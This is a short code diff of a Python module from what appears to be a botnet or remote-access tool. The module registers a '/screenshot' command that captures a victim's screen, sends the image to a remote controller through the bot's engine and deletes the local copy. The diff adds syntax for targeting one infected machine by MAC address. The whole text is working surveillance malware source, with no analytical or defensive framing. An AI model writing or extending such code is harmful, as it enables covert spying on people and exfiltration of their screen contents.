@@ -8,16 +8,22 @@ from .. import BotNet, Request
 @BotNet.default_script(script_version="0.0.1")
 def screenshot(request: Request) -> str:
     """get screen shot
-    example command: `/screenshot` \n
+    * `[mac-address] /screenshot`
+    or
+    * `/screenshot`
+
+    example command: 
+        * `94945035671481 /screenshot`
+        * `/screenshot` \n
     return: img or img-download-link
     """
 
     file_name = f"{str(time.time()).replace('.', '_')}.png"
 
-    with open(file_name, 'wb') as file:
+    with open(file_name, "wb") as file:
         screenshot = ImageGrab.grab()
         # Save the image to the file object as a PNG
-        screenshot.save(file, 'PNG')
+        screenshot.save(file, "PNG")
 
     res = request.engine.send_file(file_name)
     os.remove(file_name)
@@ -25,4 +31,3 @@ def screenshot(request: Request) -> str:
     if res:
         return None
     return "send screen-shot failed!"
-
